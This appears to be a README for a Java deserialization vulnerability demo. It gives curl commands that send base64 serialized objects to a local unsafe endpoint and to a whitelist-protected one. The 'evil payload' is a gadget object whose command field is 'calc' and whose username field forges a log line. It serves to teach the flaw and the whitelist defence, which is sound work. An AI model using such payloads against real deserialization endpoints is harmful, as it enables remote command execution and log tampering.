# java-serialization-vuln-demo

http://127.0.0.1:8080/api/unsafe-deserialize-base64
http://127.0.0.1:8080/api/whitelist-deserialize-base64

# Payloads
## evil payload
```bash
curl -X POST -d "payload=rO0ABXNyADBjb20uc2hlbjE5OTEudnVsbi5zZXJpYWxpemF0aW9uLmJlYW5zLkdhZGdldEJlYW5y3rJGZPj-3gIAAkwAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0AARjYWxjdAA6eHh4eCANCjIwMjQtWFgtWFhUWFg6WFg6WFguMDAwKzA4OjAwICBJTkZPIFhYWFggLS0tIEhBQ0tFRA==" http://127.0.0.1:8080/api/unsafe-deserialize-base64

curl -X POST -d "payload=rO0ABXNyADBjb20uc2hlbjE5OTEudnVsbi5zZXJpYWxpemF0aW9uLmJlYW5zLkdhZGdldEJlYW5y3rJGZPj-3gIAAkwAB2NvbW1hbmR0ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0AARjYWxjdAA6eHh4eCANCjIwMjQtWFgtWFhUWFg6WFg6WFguMDAwKzA4OjAwICBJTkZPIFhYWFggLS0tIEhBQ0tFRA==" http://127.0.0.1:8080/api/whitelist-deserialize-base64
```

## normal payload
```bash
curl -X POST -d "payload=rO0ABXNyAC5jb20uc2hlbjE5OTEudnVsbi5zZXJpYWxpemF0aW9uLmJlYW5zLlVzZXJCZWFuNJT1lLbj6e8CAAJMAAVmaXJzdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wABGxhc3RxAH4AAXhwdAAKZmlyc3QgbmFtZXQACWxhc3QgbmFtZQ==" http://127.0.0.1:8080/api/unsafe-deserialize-base64

curl -X POST -d "payload=rO0ABXNyAC5jb20uc2hlbjE5OTEudnVsbi5zZXJpYWxpemF0aW9uLmJlYW5zLlVzZXJCZWFuNJT1lLbj6e8CAAJMAAVmaXJzdHQAEkxqYXZhL2xhbmcvU3RyaW5nO0wABGxhc3RxAH4AAXhwdAAKZmlyc3QgbmFtZXQACWxhc3QgbmFtZQ==" http://127.0.0.1:8080/api/whitelist-deserialize-base64
```